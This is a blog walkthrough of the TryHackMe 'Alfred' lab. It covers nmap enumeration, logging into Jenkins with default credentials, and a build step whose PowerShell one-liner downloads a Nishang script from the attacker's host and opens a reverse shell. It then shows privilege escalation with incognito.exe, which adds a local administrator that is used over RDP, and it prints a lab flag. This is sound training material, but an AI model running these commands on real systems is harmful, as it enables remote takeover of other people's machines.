<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Imtodess ">
<meta name="description" content="Exploitation Guide For Alfred Summary In this room, we&amp;rsquo;ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we&amp;rsquo;ll use an interesting privilege escalation method to get full system access.
Enumeration Service Enumeration using Nmap First we will do a quick scan to see which services are running on the target machine." />
<meta name="keywords" content=", CTFs, boot2root, THM, Windows, oscp path, token access, privescs" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://imtodess.github.io/posts/2021/07/thm-alfred-walkthrough/" />


    <title>
        
            THM | Alfred | Walkthrough :: Imtodess 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://imtodess.github.io/main.1b0c2a43eaa94aafc5b56185098d0d43797dccf963fa479c7a153b858461d09a.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://imtodess.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://imtodess.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://imtodess.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://imtodess.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://imtodess.github.io/safari-pinned-tab.svg" color="#1b1c1d">
    <link rel="shortcut icon" href="https://imtodess.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="#1b1c1d">
    <meta name="theme-color" content="#1b1c1d">



<meta itemprop="name" content="THM | Alfred | Walkthrough">
<meta itemprop="description" content="Exploitation Guide For Alfred Summary In this room, we&rsquo;ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we&rsquo;ll use an interesting privilege escalation method to get full system access.
Enumeration Service Enumeration using Nmap First we will do a quick scan to see which services are running on the target machine.">
<meta itemprop="datePublished" content="2021-07-11T10:24:04+05:45" />
<meta itemprop="dateModified" content="2021-07-11T10:24:04+05:45" />
<meta itemprop="wordCount" content="983">
<meta itemprop="image" content="https://imtodess.github.io/img/portrait.jpg"/>



<meta itemprop="keywords" content="CTFs,boot2root,THM,Windows,oscp path,token access,privescs," />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://imtodess.github.io/img/portrait.jpg"/>

<meta name="twitter:title" content="THM | Alfred | Walkthrough"/>
<meta name="twitter:description" content="Exploitation Guide For Alfred Summary In this room, we&rsquo;ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we&rsquo;ll use an interesting privilege escalation method to get full system access.
Enumeration Service Enumeration using Nmap First we will do a quick scan to see which services are running on the target machine."/>




    <meta property="og:title" content="THM | Alfred | Walkthrough" />
<meta property="og:description" content="Exploitation Guide For Alfred Summary In this room, we&rsquo;ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we&rsquo;ll use an interesting privilege escalation method to get full system access.
Enumeration Service Enumeration using Nmap First we will do a quick scan to see which services are running on the target machine." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://imtodess.github.io/posts/2021/07/thm-alfred-walkthrough/" />
<meta property="og:image" content="https://imtodess.github.io/img/portrait.jpg"/>
<meta property="article:published_time" content="2021-07-11T10:24:04+05:45" />
<meta property="article:modified_time" content="2021-07-11T10:24:04+05:45" /><meta property="og:see_also" content="https://imtodess.github.io/posts/2021/07/thm-hackpark-walkthrough-no-metasploit/" />







    <meta property="article:published_time" content="2021-07-11 10:24:04 &#43;0545 &#43;0545" />










    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://imtodess.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">$</span>
            <span class="logo__text">cd ~/imtodess</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://imtodess.github.io/about/">About</a></li><li><a href="https://imtodess.github.io/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        5 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://imtodess.github.io/posts/2021/07/thm-alfred-walkthrough/">THM | Alfred | Walkthrough</a>
      </h1>

      

      
        <hr />
        <aside id="toc">
          <div class="toc-title">Table of Contents</div>
          <nav id="TableOfContents">
  <ul>
    <li><a href="#exploitation-guide-for-alfred">Exploitation Guide For Alfred</a>
      <ul>
        <li><a href="#summary">Summary</a></li>
      </ul>
    </li>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#service-enumeration-using-nmap">Service Enumeration using Nmap</a></li>
        <li><a href="#web-enumeration">Web Enumeration</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#initial-exploit">Initial exploit</a></li>
        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </aside>
        <hr />

      

      <div class="post-content">
        <h2 id="exploitation-guide-for-alfred">Exploitation Guide For Alfred</h2>
<h3 id="summary">Summary</h3>
<p>In this room, we&rsquo;ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we&rsquo;ll use an interesting privilege escalation method to get full system access.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="service-enumeration-using-nmap">Service Enumeration using Nmap</h3>
<p>First we will do a quick scan to see which services are running on the target machine.</p>
<pre><code>┌──(kali㉿kali)-[~/ctf/thm/alfred]
└─$ nmap $ip -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:06 EDT
Nmap scan report for 10.10.145.45
Host is up (0.19s latency).

PORT     STATE SERVICE
80/tcp   open  http  
3389/tcp open  ms-wbt-server
8080/tcp open  http
</code></pre><p>Now we will do comprehensive scans on three ports we found from quick scan.</p>
<pre><code>┌──(kali㉿kali)-[~/ctf/thm/alfred]
└─$ sudo nmap -p 80,3389,8080 -sSCV $ip -oN nmap_initial.txt -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:06 EDT
Nmap scan report for 10.10.145.45
Host is up (0.19s latency).

PORT     STATE SERVICE        VERSION
80/tcp   open  http           Microsoft IIS httpd 7.5
| http-methods:  
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-07-08T13:51:33
|_Not valid after:  2022-01-07T13:51:33
|_ssl-date: 2021-07-09T14:08:04+00:00; -1s from scanner time.
8080/tcp open  http           Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry  
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.34 seconds
</code></pre><h3 id="web-enumeration">Web Enumeration</h3>
<p>We have HTTP services running on two ports i.e <code>80</code> and <code>8080</code>. On visiting web instance at port <code>8080</code> we are greeted by the login page.
<img src="https://imtodess.github.io/img/alfred/jenkins.png" alt="">
After some enumeration and trying default/common credentials we find out that the login credential is <code>admin:admin</code>.</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="initial-exploit">Initial exploit</h3>
<p>Since we are authenticated, we can exploit this jenkins instance in various ways to obtain a shell. In this walkthrough we will be exploiting the common misconfiguration on automation server using one of the tools from <a href="https://github.com/samratashok/nishang">samratok/nishang</a>.</p>
<p>First we will create a new freestyle project ( Freestyle project is a project in which you can run any types of build.)
<img src="https://imtodess.github.io/img/alfred/jenkins1.png" alt="">
Now lets configure it to run batch command.
<img src="https://imtodess.github.io/img/alfred/jenkins2.png" alt="">
We will put our malicious command here which when executed will give us the reverse shell.
<img src="https://imtodess.github.io/img/alfred/jenkins3.png" alt=""></p>
<p>Payload :</p>
<pre><code>powershell iex (New-Object Net.WebClient).DownloadString('http://&lt;your-ip&gt;/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress &lt;your-ip&gt; -Port &lt;your-port&gt;
</code></pre><p>For this payload to work we need to host http server on the directory where <code>Invoker-powersheltcp.ps1</code> is located.</p>
<pre><code>┌──(kali㉿kali)-[/opt/windows/nishang/Shells]
└─$ ls
Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
Invoke-PoshRatHttp.ps1               Invoke-PowerShellWmi.ps1
Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
Invoke-PowerShellTcpOneLine.ps1

┌──(kali㉿kali)-[/opt/windows/nishang/Shells]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre><p>Start a <code>netcat</code> listener to receive the shell.</p>
<pre><code>┌──(kali㉿kali)-[~/ctf/thm/alfred/exploit]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
</code></pre><p>Then execute the payload by building the project. We will get our initial shell.</p>
<pre><code>┌──(kali㉿kali)-[~/ctf/thm/alfred/exploit]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.11.25.224] from (UNKNOWN) [10.10.145.45] 49225
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\rce&gt;whoami
alfred\bruce
PS C:\Program Files (x86)\Jenkins\workspace\rce&gt; cd C:\Users\bruce\Desktop
PS C:\Users\bruce\Desktop&gt; type user.txt
79007a09481963edf2e1321abd9ae2a0
</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
<p>From the initial exploit we will get the shell as user <code>bruce</code> which doesn&rsquo;t have much privileges. So we will escalate our privilege to <code>Root</code> i.e <code>(authority/system)</code>. To do this we will be exploiting one of the common misconfiguration in windows i.e Token access. You can enumerate the box for privilege escalation using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">Winpeas</a>.
We will do manual Enumeration for this walkthrough.</p>
<pre><code>PS C:\Users&gt; whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                  Description                               State    
=============================== ========================================= ========
. . .
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled  
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled  
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled  
SeCreateGlobalPrivilege         Create global objects                     Enabled  

. . .
</code></pre><p>As you can see <code>SeImpersonatePrivilege</code> is enabled. We will be exploiting this using <code>incognito</code> module.
You can get the incognito from <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">here</a>.</p>
<p>Now we will transfer the module to target machine using <code>smb</code>.
First we will start <code>smbserver</code> in the directory containing the module.</p>
<pre><code>┌──(kali㉿kali)-[/opt/windows/incognito2]

└─$ ls
child_process.c       incognito.c            remote_connection.c
child_process.h       incognito.exe          remote_connection.h
. . .                                                                                     

┌──(kali㉿kali)-[/opt/windows/incognito2]

└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .     
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre><p>Download the binary in target machine.</p>
<pre><code>PS C:\Users\bruce\Desktop&gt; copy \\10.11.25.224\share\incognito.exe   
PS C:\Users\bruce\Desktop&gt; dir
Mode                LastWriteTime     Length Name                               
----                -------------     ------ ----                               
-a---         7/18/2012   7:12 PM     102912 incognito.exe                                   
-a---        10/25/2019  11:22 PM         32 user.txt   
</code></pre><p>For easy exploitation we can just create a user with high level privilege using the incognito module and <code>RDP</code> into the target machine.</p>
<pre><code>// Create user
PS C:\Users\bruce\Desktop&gt; ./incognito.exe add_user root root                                               
[-] WARNING: Not running as SYSTEM. Not all tokens will be available
[*] Enumerating tokens                              
[*] Attempting to add user root to host 127.0.0.1
[+] Successfully added user                                                             

// Now add the user to Administrators group                
PS C:\Users\bruce\Desktop&gt; ./incognito.exe add_localgroup_user Administrators root                 
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.                   
[*] Enumerating tokens                          
[*] Attempting to add user root to local group Administrators on host 127.0.0.1                               
[+] Successfully added user to local group     
</code></pre><p>Just login using rdp with the user you created and get the sweet root flag.</p>
<pre><code>┌──(kali㉿kali)-[~/ctf/thm/alfred/exploit]
└─$ rdesktop -g 90% -u root -p root 10.10.145.45   
</code></pre><p><img src="https://imtodess.github.io/img/alfred/jenkins5.png" alt=""></p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://imtodess.github.io/tags/ctfs/">CTFs</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/boot2root/">boot2root</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/thm/">THM</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/windows/">Windows</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/oscp-path/">oscp path</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/token-access/">token access</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/privescs/">privescs</a></span>
        
    </p>

      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        983 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2021-07-11 10:24
        

         
          
        
      </p>
    </div>

    
    <div class="pagination">
        <div class="pagination__title">
            <span class="pagination__title-h"></span>
            <hr />
        </div>

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="https://imtodess.github.io/posts/2021/07/thm-hackpark-walkthrough-no-metasploit/">
                    <span class="button__icon">←</span>
                    <span class="button__text">THM | Hackpark | Walkthrough (No Metasploit)</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="https://imtodess.github.io/posts/2021/07/htb-ophiuchi-walkthrough/">
                    <span class="button__text">HTB | Ophiuchi | Walkthrough</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://imtodess.github.io/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>



    </body>
</html>
